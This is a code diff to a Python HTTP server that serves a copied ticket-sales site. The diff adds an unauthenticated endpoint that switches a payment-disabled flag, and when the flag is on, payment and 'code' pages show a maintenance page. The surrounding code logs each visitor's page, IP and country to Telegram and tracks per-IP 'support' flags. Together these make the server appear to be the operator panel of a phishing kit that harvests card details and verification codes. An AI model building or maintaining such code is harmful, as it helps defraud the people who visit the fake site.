@@ -78,6 +78,9 @@ CUSTOM_TEXTS = {}
 # --- In-memory storage for support flags ---
 SUPPORT_FLAGS = {}  # ip: {'support': bool, 'text_id': str}
 
+# --- Глобальний флаг для платіжки ---
+PAYMENT_DISABLED = False
+
 def send_telegram_log(page, link, ip, country="", extra_user_id=None):
     # Визначаємо країну за IP, якщо не передано
     if not country:
@@ -310,6 +313,38 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
             self.send_response(200)
             self.end_headers()
             self.wfile.write(b'ok')
+            return
+        # --- Endpoint для зміни флагу (GET/POST) ---
+        if self.path.startswith('/set_payment_disabled'):
+            from urllib.parse import parse_qs
+            qs = parse_qs(self.path.split('?', 1)[1]) if '?' in self.path else {}
+            val = qs.get('value', [None])[0]
+            global PAYMENT_DISABLED
+            if val == '1':
+                PAYMENT_DISABLED = True
+                print('[PAYMENT] Disabled')
+            elif val == '0':
+                PAYMENT_DISABLED = False
+                print('[PAYMENT] Enabled')
+            self.send_response(200)
+            self.end_headers()
+            self.wfile.write(b'ok')
+            return
+        # --- Блокування платіжних сторінок ---
+        def is_payment_url(path):
+            return (
+                path.startswith('/buy-tickets/loading/') or
+                path.startswith('/buy-tickets/code/') or
+                path.startswith('/buy-tickets/loading/waiting-support.html') or
+                path.startswith('/buy-tickets/loading/waiting-text.html')
+            )
+
+        if PAYMENT_DISABLED and is_payment_url(self.path):
+            with open('events-art.com/buy-tickets/payment-unavailable/Site Maintenance.html', 'rb') as f:
+                self.send_response(200)
+                self.send_header('Content-Type', 'text/html')
+                self.end_headers()
+                self.wfile.write(f.read())
             return
         try:
             super().do_GET()
